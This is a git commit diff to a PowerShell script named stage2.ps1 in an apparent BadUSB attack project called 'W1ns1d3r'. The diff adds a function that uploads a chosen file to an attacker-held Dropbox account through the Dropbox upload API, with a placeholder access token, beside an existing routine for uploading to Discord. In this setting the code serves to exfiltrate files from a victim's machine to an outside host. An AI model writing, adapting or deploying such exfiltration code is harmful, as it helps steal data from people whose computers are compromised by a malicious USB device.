5cbaf7dff05e7084983982788842003541c3fde7
Gvte-Kali <132758165+Gvte-Kali@users.noreply.github.com>
2024-02-02 13:33:21 +0100

    Update stage2.ps1

--- BadUSB/W1ns1d3r/W1ns1d3r/stage2.ps1
+++ BadUSB/W1ns1d3r/W1ns1d3r/stage2.ps1
@@ -21,6 +21,27 @@ function TempDir {
     Set-Location -Path "C:\temp"
 }
 
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN-HERE"   # Replace with your DropBox Access Token
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $DropBoxAccessToken
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
 
 
 #Function to upload to discord
